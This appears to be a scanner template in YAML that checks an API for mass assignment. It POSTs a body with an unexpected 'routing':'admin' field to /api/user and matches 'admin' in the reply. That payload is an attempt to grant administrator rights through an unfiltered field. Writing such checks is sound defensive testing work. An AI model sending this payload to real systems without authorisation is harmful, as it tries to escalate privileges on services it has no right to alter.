id: mass3-274
name: 'Mass field routing'
severity: high
type: active
tags:
  - mass-assignment
  - auth
  - api
description: 'Unfiltered routing on /api/user'
requests:
  - method: POST
    path: '{{BaseURL}}/api/user'
    body: '{"name":"t","routing":"admin"}'
    matchers:
      - type: word
        part: body
        words:
          - 'admin'
